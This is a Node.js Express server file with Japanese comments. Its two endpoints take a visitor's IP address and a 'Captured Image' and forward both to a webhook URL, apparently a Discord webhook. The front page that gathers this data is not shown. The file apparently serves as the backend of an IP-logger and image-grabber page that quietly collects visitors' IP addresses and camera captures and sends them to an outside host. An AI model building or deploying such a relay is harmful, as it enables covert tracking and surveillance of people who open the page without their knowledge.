require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const multer = require('multer');
const cors = require('cors');

const app = express();
const upload = multer();
const WEBHOOK_URL = process.env.WEBHOOK_URL;

if (!WEBHOOK_URL) {
    console.error('環境変数 WEBHOOK_URL が設定されていません');
    process.exit(1);
}

app.use(cors()); // CORSエラーを防ぐ
app.use(express.json({ limit: '10mb' })); // JSONのデータサイズ制限を10MBに
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

// 📌 動作確認用API
app.get('/api', (req, res) => {
    res.send('API Server is running');
});

// 📌 IPアドレスをWebhookに送信
app.post('/api/send-ip', async (req, res) => {
    try {
        const { ip } = req.body;
        if (!ip) return res.status(400).send('No IP provided');

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `Client IP: ${ip}` })
        });

        res.status(200).send('IP sent');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error sending IP');
    }
});

// 📌 画像をWebhookに送信
app.post('/api/send-image', upload.none(), async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) return res.status(400).send('No image provided');

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: "Captured Image:", embeds: [{ image: { url: image } }] })
        });

        res.status(200).send('Image sent');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error sending image');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

